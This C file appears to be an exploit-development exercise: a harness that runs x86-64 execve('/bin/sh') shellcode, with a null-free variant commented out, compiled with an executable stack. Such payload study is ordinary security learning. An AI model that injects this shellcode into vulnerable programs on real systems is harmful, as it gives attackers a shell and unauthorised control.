//gcc -z execstack shellcode.c
//a.out

int main()
{
	unsigned char shellcode[] = "\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05";

    //unsigned char shellcodeNonZero[] = "\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x77\x48\xc1\xe3\x08\x48\xc1\xeb\x08\x53\x48\x89\xe7\xb0\x3b\x0f\x05";

    void (*exec)() = (void(*)())shellcode;
    exec();
}
